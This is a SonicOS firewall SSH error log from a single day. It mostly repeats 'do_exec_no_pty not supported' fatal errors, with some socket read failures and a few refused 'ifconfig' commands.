+01/15 04:25:47.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:51.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:25:56.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:01.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:05.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:10.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:16.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:21.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:25.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:31.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:37.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:42.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:49.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:26:55.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:02.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:08.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:13.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:17.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:22.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:26.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:31.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:37.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:44.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:50.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:27:57.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:03.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:09.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:15.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:21.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:27.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:33.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:39.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:45.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:52.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:28:58.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:05.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:11.496: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:17.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:24.336: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:30.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:37.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:43.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:50.000: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:29:56.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:03.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:08.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:15.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:21.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:27.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:33.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:39.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:45.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:51.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:30:57.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:03.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:10.112: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:16.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:22.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:28.560: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:34.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:41.112: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:47.560: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:31:53.800: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:00.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:06.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:13.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:19.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:25.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:32.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:38.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:44.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:51.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:32:57.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:03.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:09.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:15.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:21.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:28.032: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:34.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:40.816: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:47.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:33:53.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:00.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:06.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:12.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:19.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:25.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:31.768: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:38.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:44.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:50.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:34:56.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:02.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:08.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:14.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:20.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:26.864: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:32.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:39.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:45.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:51.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:35:57.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:03.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:09.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:15.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:21.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:27.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:33.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:39.800: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:45.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:51.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:36:58.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:04.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:10.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:16.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:22.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:28.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:34.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:41.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:47.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:53.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:37:59.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:06.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:11.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:18.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:24.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:30.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:36.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:42.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:48.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:38:54.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:01.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:07.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:13.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:19.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:25.864: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:32.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:38.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:44.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:50.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:39:56.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:02.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:08.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:14.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:20.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:27.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:33.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:39.480: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:45.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:51.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:40:57.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:03.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:10.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:16.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:23.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:29.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:35.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:42.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:48.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:41:55.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:01.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:07.832: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:20.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:26.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:33.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:39.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:46.240: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:52.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:42:58.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:05.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:12.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:18.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:25.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:31.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:37.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:43.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:49.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:43:55.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:01.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:07.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:13.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:20.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:26.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:32.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:38.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:44.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:50.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:44:56.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:02.736: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:08.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:14.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:20.864: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:27.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:33.208: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:39.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:45.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:51.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:45:57.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:03.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:09.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:15.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:21.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:27.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:33.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:39.624: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:45.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:51.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:46:57.560: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:03.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:09.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:15.768: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:21.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:27.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:33.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:40.464: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:46.032: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:52.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:47:58.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:04.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:10.432: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:16.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:22.608: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:28.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:34.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:40.896: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:46.864: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:53.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:48:59.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:05.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:11.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:17.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:23.592: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:29.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:35.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:41.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:47.832: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:49:54.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:00.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:06.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:12.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:18.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:24.672: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:30.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:36.848: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:43.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:49.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:50:55.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:01.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:07.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:13.752: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:20.096: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:26.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:31.512: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:35.704: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:39.800: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:44.032: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:48.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:52.112: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:51:56.480: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:00.384: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:04.528: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:08.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:12.576: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:16.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:20.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:24.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:28.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:33.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:37.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:41.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:45.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:49.832: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:53.944: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:52:58.128: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:02.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:06.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:10.656: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:14.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:18.688: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:22.880: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:27.080: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:31.336: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:36.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:41.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:45.048: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:49.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:53.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:53:57.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:03.256: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:09.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:15.480: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:21.288: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:27.304: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:33.368: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:38.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:42.016: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:46.160: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:50.224: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:54.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:54:58.496: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:03.320: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:08.480: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:12.544: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:16.784: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:22.176: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:28.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:32.720: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:37.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:42.064: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:46.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:50.144: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:54.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:55:58.448: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:02.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:07.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:11.928: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:16.400: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:20.272: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:24.640: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:29.192: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:33.352: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 04:56:37.512: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 05:07:07.128: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/15 05:53:55.352: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 06:36:00.736: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/15 06:40:43.656: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 07:27:28.704: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 07:46:25.416: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 08:14:14.912: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 09:01:07.608: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 09:47:59.768: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/15 10:34:57.816: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/15 11:21:57.720: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 12:08:58.784: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 12:56:07.336: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 13:43:05.832: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 14:30:05.400: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 14:38:43.480: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 14:39:46.240: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/15 15:17:09.288: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 15:51:15.192: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 15:51:15.432: fatal - no hostkey alg
+01/15 15:51:16.176: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/15 16:04:14.352: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 16:51:18.656: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 17:38:16.704: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 18:25:14.448: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 18:50:11.192: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/15 19:05:17.880: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/15 19:08:27.592: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/15 19:12:14.464: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 19:12:16.128: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/15 19:36:42.048: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/15 19:59:08.832: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 20:46:01.192: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 20:55:46.912: fatal - do_exec_no_pty not supported in SonicOS command '(null)'
+01/15 21:32:56.400: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 22:19:50.944: fatal - Read from socket failed: errno = 0x3a, connection_in 33
